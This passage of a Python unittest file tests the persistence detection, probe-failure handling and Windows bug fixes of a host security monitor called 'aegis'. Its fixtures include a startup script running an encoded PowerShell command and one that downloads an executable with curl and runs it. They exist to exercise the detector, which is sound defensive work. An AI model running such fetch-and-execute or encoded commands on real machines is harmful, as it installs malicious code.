        script = os.path.join(self.startup, "run.bat")
        with open(script, "w") as f:
            f.write("@echo off\r\npowershell -enc %s\r\n" % ("A" * 60))
        snap = self._run_snapshot({})
        key = "startup:" + script
        self.assertIn(key, snap)
        # A dropped .bat is persistence whose PAYLOAD is its own text, so the
        # body is captured into args and must reach the argv scorer.
        signals = dict(aegis._argv_signals(snap[key]["args"][0]))
        self.assertEqual("HIGH", signals.get("powershell-encoded-command"))
        self.assertIn(aegis._persistence_severity(snap[key]),
                      ("HIGH", "CRITICAL"))

    def test_scheduled_task_is_snapshotted_and_microsoft_tree_skipped(self):
        snap = self._run_snapshot({})
        self.assertIn("task:\\Updater", snap)
        # schtasks stores a single command string with Windows separators.
        self.assertEqual(self.appdata + "\\upd.exe",
                         snap["task:\\Updater"]["program"])
        self.assertEqual([], [k for k in snap if "Defrag" in k])

    def test_service_outside_protected_tree_is_kept_system32_skipped(self):
        evil = os.path.join(self.appdata, "svc.exe")
        services = _FakeWinregKey(subkeys={
            "EvilSvc": _FakeWinregKey({"ImagePath": '"%s" -k' % evil}),
            "GoodSvc": _FakeWinregKey(
                {"ImagePath": "C:\\Windows\\System32\\svchost.exe -k netsvcs"}),
            "NoImage": _FakeWinregKey({"Start": 2}),
        })
        snap = self._run_snapshot({
            ("HKLM", r"SYSTEM\CurrentControlSet\Services"): services})
        self.assertIn("service:EvilSvc", snap)
        self.assertEqual(evil, snap["service:EvilSvc"]["program"])
        self.assertNotIn("service:GoodSvc", snap,
                         "a System32 service is trusted-location churn")
        self.assertNotIn("service:NoImage", snap)

    def test_missing_registry_keys_never_raise(self):
        # Every hive/key absent must be skipped, not crash the scan. With
        # schtasks also returning nothing, the whole snapshot is empty.
        self._schtasks = ""
        self.assertEqual({}, self._run_snapshot({}))

    def test_all_surfaces_combine_into_one_diffable_snapshot(self):
        payload = os.path.join(self.appdata, "evil.exe")
        script = os.path.join(self.startup, "boot.cmd")
        with open(script, "w") as f:
            f.write("curl http://198.51.100.5/a.exe -o a.exe && a.exe\r\n")
        tree = {
            ("HKCU", r"Software\Microsoft\Windows\CurrentVersion\Run"):
                _FakeWinregKey({"R": payload}),
            ("HKLM", r"SYSTEM\CurrentControlSet\Services"): _FakeWinregKey(
                subkeys={"S": _FakeWinregKey({"ImagePath": payload})}),
        }
        snap = self._run_snapshot(tree)
        self.assertEqual(4, len(snap), snap)   # run key + service + startup + task
        # The whole point of one record shape: the shared differ works on it.
        findings = aegis.check_persistence({}, snap)
        self.assertEqual(4, len(findings))
        self.assertTrue(all(f["category"] == "persistence" for f in findings))
        # And an unchanged snapshot must be silent.
        self.assertEqual([], aegis.check_persistence(snap, snap))


# --------------------------------------------------------------------------- #
# Non-answer handling: a failed probe must never read as "clean"
# --------------------------------------------------------------------------- #
class ProbeFailureIsNeverClean(unittest.TestCase):
    """The doctrine snapshot_btm() already enforces, applied to every probe
    added by the port: a command that FAILED is a non-answer (None → DEGRADED),
    never an empty world. Returning {} would adopt a false-empty baseline and
    storm the moment the probe next succeeds; returning [] would report clean
    coverage the tool does not have."""

    def _with_run(self, fn, out="", err="boom", rc=1):
        saved = aegis.run
        aegis.run = lambda cmd, timeout=15, extra_env=None: (out, err, rc)
        try:
            return fn()
        finally:
            aegis.run = saved

    def test_defender_exclusion_probe_failure_is_a_non_answer(self):
        self.assertIsNone(self._with_run(aegis.snapshot_win_exclusions))

    def test_wmi_probe_failure_is_a_non_answer(self):
        self.assertIsNone(self._with_run(aegis.snapshot_wmi_subscriptions))

    def test_event_log_probe_failure_is_a_non_answer(self):
        self.assertIsNone(self._with_run(aegis.check_windows_event_log))

    def test_windows_listener_probe_failure_is_a_non_answer(self):
        self.assertIsNone(self._with_run(aegis._snapshot_listeners_windows))

    def test_successful_probe_with_no_results_is_a_real_empty(self):
        # rc=0 and no output means "nothing configured" — that IS an answer,
        # and must stay {} so it baselines normally.
        self.assertEqual({}, self._with_run(aegis.snapshot_win_exclusions,
                                            out="", err="", rc=0))
        self.assertEqual({}, self._with_run(aegis.snapshot_wmi_subscriptions,
                                            out="", err="", rc=0))

    def test_readable_but_empty_journal_is_coverage_not_a_gap(self):
        # auth.log is root-only on most distros; falling back to a journal that
        # reads fine but has no sshd/sudo/useradd lines means "nothing to
        # report". Treating that as DEGRADED opened a bogus recurring
        # "Security coverage degraded" incident on every quiet box.
        saved = (aegis._AUTH_LOG_FILES, aegis.run, aegis._read_text)
        aegis._AUTH_LOG_FILES = ("/nonexistent/auth.log",)
        aegis._read_text = lambda p, limit=None: None
        aegis.run = lambda cmd, timeout=15, extra_env=None: ("", "", 0)
        try:
            self.assertEqual([], aegis.check_auth_log())
        finally:
            aegis._AUTH_LOG_FILES, aegis.run, aegis._read_text = saved

    def test_unreadable_log_and_unreadable_journal_is_degraded(self):
        saved = (aegis._AUTH_LOG_FILES, aegis.run, aegis._read_text)
        aegis._AUTH_LOG_FILES = ("/nonexistent/auth.log",)
        aegis._read_text = lambda p, limit=None: None
        aegis.run = lambda cmd, timeout=15, extra_env=None: ("", "denied", 1)
        try:
            self.assertIsNone(aegis.check_auth_log())
        finally:
            aegis._AUTH_LOG_FILES, aegis.run, aegis._read_text = saved


class ListenerAttribution(unittest.TestCase):
    def test_unattributable_listener_names_its_owning_uid(self):
        fs = aegis.diff_listeners({}, {"?:22": {"path": "?", "uid": "0"}})
        self.assertEqual(1, len(fs))
        self.assertIn("uid 0", fs[0]["detail"])
        self.assertEqual("0", fs[0]["uid"])

    def test_legacy_string_snapshot_values_still_diff(self):
        # Baselines written before uid attribution store a bare path string;
        # an upgrade must not crash or re-alert on them.
        fs = aegis.diff_listeners({}, {"/usr/sbin/sshd:22": "/usr/sbin/sshd"})
        self.assertEqual(1, len(fs))
        self.assertEqual("/usr/sbin/sshd", fs[0]["path"])

    def test_known_listener_is_not_re_alerted_after_the_value_shape_change(self):
        # The KEY is what the differ compares, so adding uid to the VALUE must
        # not resurrect an already-baselined listener.
        prior = {"/usr/sbin/sshd:22": "/usr/sbin/sshd"}
        cur = {"/usr/sbin/sshd:22": {"path": "/usr/sbin/sshd", "uid": "0"}}
        self.assertEqual([], aegis.diff_listeners(prior, cur))


# --------------------------------------------------------------------------- #
# Registry integrity: every sensor/surface the platform registers must exist
# --------------------------------------------------------------------------- #
class RegistryIntegrity(unittest.TestCase):
    def test_all_surface_callables_are_defined(self):
        for key, snap_fn, diff_fn in aegis.SURFACES:
            self.assertTrue(callable(snap_fn), "%s snapshot" % key)
            self.assertTrue(callable(diff_fn), "%s diff" % key)

    def test_surface_keys_are_unique(self):
        keys = [k for k, _s, _d in aegis.SURFACES]
        self.assertEqual(len(keys), len(set(keys)))

    def test_platform_specific_surfaces_are_registered(self):
        keys = {k for k, _s, _d in aegis.SURFACES}
        if aegis.IS_LINUX:
            self.assertIn("kernel_modules", keys)
            self.assertIn("suid_binaries", keys)
        elif aegis.IS_WIN:
            self.assertIn("win_wmi_subscriptions", keys)
            self.assertIn("win_defender_exclusions", keys)
        else:
            self.assertIn("btm", keys)
            self.assertIn("profiles", keys)

    def test_windows_and_linux_sensor_entrypoints_exist(self):
        for name in ("_snapshot_persistence_linux", "_snapshot_persistence_mac",
                     "_check_hardening_linux", "_check_hardening_windows",
                     "_check_hardening_mac", "check_auth_log",
                     "check_windows_event_log", "_neutralize_systemd",
                     "_neutralize_windows", "_neutralize_launchd",
                     "_install_linux", "_install_windows", "_install_mac"):
            self.assertTrue(callable(getattr(aegis, name, None)),
                            "%s is missing" % name)

    def test_windows_persistence_snapshot_requires_winreg_only_on_windows(self):
        # The winreg import is inside the function so the module still imports
        # (and every other sensor still runs) on POSIX.
        if not aegis.IS_WIN:
            with self.assertRaises(Exception):
                aegis._snapshot_persistence_windows()


# --------------------------------------------------------------------------- #
# Text encoding.
#
# Found by the first real Windows run: `write_report` opened latest.md in text
# mode with no encoding, so Python used the locale codec. On Windows that is
# cp1252, every report line starts with a severity icon, and the icon is not
# representable -- so `scan` died with UnicodeEncodeError the moment it had
# anything to report. The tool ran, found the threat, and then crashed instead
# of telling anyone.
#
# The behavioural test below only fails on a machine whose locale codec cannot
# hold the icon (that is what CI's Windows job is for). The static test pins the
# whole CLASS on every platform, which is the part that actually stays fixed:
# any new text-mode open without an explicit encoding is a fresh instance of the
# same bug on the next Windows box.
# --------------------------------------------------------------------------- #
# --------------------------------------------------------------------------- #
# Defects found by the FIRST run against a real Windows machine. Each one was
# invisible to the fake-winreg / captured-output tests above, and in two cases
# those tests actively agreed with the bug.
# --------------------------------------------------------------------------- #
class FoundOnRealWindows(unittest.TestCase):

    def test_winlogon_key_lives_under_windows_nt(self):
        # Winlogon is under "Windows NT"; the Run keys are under plain
        # "Windows". aegis used the latter for both, winreg raised, _reg_values
        # swallowed it, and the Shell/Userinit hijack check (T1547.004) examined
        # nothing on every Windows host that ever ran it. The fake-registry test
        # was BUILT FROM THE SAME CONSTANT, so it passed throughout.
        self.assertIn(r"Windows NT\CurrentVersion\Winlogon",
                      aegis._WIN_LOGON_KEY)
        self.assertNotIn(r"Software\Microsoft\Windows\CurrentVersion\Winlogon",
                         aegis._WIN_LOGON_KEY)

    def test_no_powershell_snippet_uses_a_backtick_escape(self):
        # PowerShell honours backtick escapes only inside DOUBLE-quoted strings.
        # `_WIN_PROC_PS` used '{0}`t{1}' -- single-quoted -- so the separator was
        # emitted literally, every line failed the 4-field split, and
        # _iter_processes() yielded ZERO processes on Windows: the whole
        # process/argv surface was dead. Pin the class, not just that one site.
        snippets = {n: v for n, v in vars(aegis).items()
                    if n.endswith("_PS") and isinstance(v, str)}
        self.assertTrue(snippets, "no PowerShell snippets found to check")
        offenders = {n: v for n, v in snippets.items() if "`" in v}
        self.assertEqual({}, offenders,
                         "backtick escapes do not survive a single-quoted "
                         "PowerShell string; build the character explicitly "
                         "(e.g. [char]9): %s" % sorted(offenders))

    def test_process_query_joins_fields_with_a_real_tab(self):
        self.assertIn("[char]9", aegis._WIN_PROC_PS)

    def test_schtasks_unescaped_quotes_do_not_poison_the_program_path(self):
        # `schtasks /query /fo csv /v` prints the Task-To-Run column without
        # doubling its embedded quotes, so a conforming CSV reader returns a
        # program path with a trailing quote. That path matches no trusted
        # prefix, hashes to None and classifies as `missing`, so a task pointing
        # at a real payload was scored against a path that does not exist.
        malformed = 'C:\\Py\\pythonw.exe" "C:\\T\\aegis.py" scan"'
        self.assertEqual(["C:\\Py\\pythonw.exe", "C:\\T\\aegis.py", "scan"],
                         aegis._win_split_cmd(malformed))

    def test_well_formed_command_lines_are_unchanged(self):
        self.assertEqual(["C:\\Py\\pythonw.exe", "C:\\T\\a.py", "scan"],
                         aegis._win_split_cmd('"C:\\Py\\pythonw.exe" '
                                              '"C:\\T\\a.py" scan'))
        self.assertEqual(["C:\\Windows\\system32\\x.exe", "-q"],
                         aegis._win_split_cmd(r"C:\Windows\system32\x.exe -q"))

    def test_a_failed_signature_probe_is_not_a_verdict_of_fine(self):
        # A cold powershell.exe was measured at 21.4s against a 30s ceiling.
        # On timeout _classify_windows returned trust="unknown", and
        # suspicious_sig("unknown") is False -- so a timed-out probe rendered
        # every unsigned and every TAMPERED binary un-suspicious. Fail-open.
        saved_run, saved_n = aegis.run, aegis._SIG_PROBE_FAILURES
        aegis.run = lambda *a, **k: ("", "timeout", 124)
        aegis._SIG_PROBE_FAILURES = 0
        try:
            result = aegis._classify_windows(r"C:\Users\x\payload.exe")
            self.assertTrue(result.get("probe_failed"),
                            "a failed probe must be distinguishable from a "
                            "verdict: %r" % result)
            self.assertEqual(1, aegis._SIG_PROBE_FAILURES,
                             "the scan must be able to report the gap")
        finally:
            aegis.run, aegis._SIG_PROBE_FAILURES = saved_run, saved_n

    def test_a_failed_signature_probe_is_never_cached(self):
        # Caching the failure makes the fail-open DURABLE: the binary stays
        # un-suspicious until its mtime or size changes.
        import tempfile
        tmp = tempfile.mkdtemp(prefix="aegis_sigfail_")
        target = os.path.join(tmp, "payload.exe")
        with open(target, "wb") as fh:
            fh.write(b"MZ\x00\x00")
        saved = (aegis._sigcache, aegis._classify_windows, aegis._classify_mac,
                 aegis._classify_linux)
        aegis._sigcache = {}
        failed = {"trust": "unknown", "team": None, "authority": None,
                  "probe_failed": True}
        aegis._classify_windows = lambda p: dict(failed)
        aegis._classify_mac = lambda p: dict(failed)
        aegis._classify_linux = lambda p: dict(failed)
        try:
            out = aegis.classify_signature(target)
            self.assertNotIn("probe_failed", out,
                             "the marker is internal; callers see the normal "
                             "shape")
            self.assertNotIn(target, aegis._sigcache,
                             "a failed probe must not be cached")
        finally:
            (aegis._sigcache, aegis._classify_windows, aegis._classify_mac,
             aegis._classify_linux) = saved
            import shutil
            shutil.rmtree(tmp, ignore_errors=True)

    def test_a_real_verdict_is_still_cached(self):
        # Positive control: the no-cache rule must not disable caching outright.
        import tempfile
        tmp = tempfile.mkdtemp(prefix="aegis_sigok_")
        target = os.path.join(tmp, "ok.exe")
        with open(target, "wb") as fh:
            fh.write(b"MZ\x00\x00")
        saved = (aegis._sigcache, aegis._classify_windows, aegis._classify_mac,
                 aegis._classify_linux)
        aegis._sigcache = {}
        good = {"trust": "unsigned", "team": None, "authority": None}
        aegis._classify_windows = lambda p: dict(good)
        aegis._classify_mac = lambda p: dict(good)
        aegis._classify_linux = lambda p: dict(good)
        try:
            aegis.classify_signature(target)
            self.assertIn(target, aegis._sigcache)
        finally:
            (aegis._sigcache, aegis._classify_windows, aegis._classify_mac,
             aegis._classify_linux) = saved
            import shutil
            shutil.rmtree(tmp, ignore_errors=True)


class TextEncodingIsPinned(unittest.TestCase):
    _SOURCE = os.path.join(os.path.dirname(os.path.dirname(
        os.path.abspath(__file__))), "aegis.py")

    def test_no_text_mode_open_relies_on_the_locale_codec(self):
        import re
        offenders = []
        with open(self._SOURCE, encoding="utf-8") as f:
            for lineno, line in enumerate(f, 1):
                # \b never matches inside Popen/urlopen; os.open is a raw fd and
                # takes no encoding, so it is excluded by name.
                if not re.search(r"\b(?:os\.fdopen|io\.open|open)\(", line):
                    continue
                if re.search(r'"[rwax]b\+?"|\bos\.open\(|encoding=', line):
                    continue
                offenders.append("%d: %s" % (lineno, line.strip()))
        self.assertEqual(offenders, [],
                         "text-mode open() without encoding= falls back to the "
                         "locale codec (cp1252 on Windows) and will crash or "
                         "silently mangle non-ASCII:\n" + "\n".join(offenders))

    def test_report_round_trips_non_ascii_as_utf8(self):
        import tempfile
        tmp = tempfile.mkdtemp(prefix="aegis_enc_")
        saved = (aegis.STATE_DIR, aegis.LATEST_MD, aegis.LATEST_JSON)
        aegis.STATE_DIR = tmp
        aegis.LATEST_MD = os.path.join(tmp, "latest.md")
        aegis.LATEST_JSON = os.path.join(tmp, "latest.json")
        try:
            f = aegis.finding("MEDIUM", "hot-dir", "Unsigned binary dropped",
                              "C:\\Users\\Bj\u00f6rn\\Downloads\\caf\u00e9.exe",
                              "hot:enc:1")
            md = aegis.write_report([f], first_run=False)
            with open(aegis.LATEST_MD, encoding="utf-8") as fh:
                self.assertEqual(fh.read(), md)
            # The icon is the byte sequence cp1252 cannot represent; assert it
            # actually reached the file rather than being dropped.
            self.assertIn(aegis.SEV_ICON["MEDIUM"], md)
        finally:
            (aegis.STATE_DIR, aegis.LATEST_MD, aegis.LATEST_JSON) = saved
            import shutil
            shutil.rmtree(tmp, ignore_errors=True)

    def test_run_never_raises_on_undecodable_tool_output(self):
        # A tool that emits a byte the locale codec cannot decode must degrade
        # to a replacement character, not blow up the surface that called it.
        if aegis.IS_WIN:
            cmd = ["cmd", "/c", "echo", "ok"]
        else:
            cmd = ["/bin/sh", "-c", r"printf 'a\377b'"]
        out, err, rc = aegis.run(cmd, timeout=10)
        self.assertEqual(rc, 0, "run() failed outright: %r / %r" % (out, err))
        self.assertTrue(out.strip(), "run() returned no output: %r" % (err,))


if __name__ == "__main__":
    unittest.main()
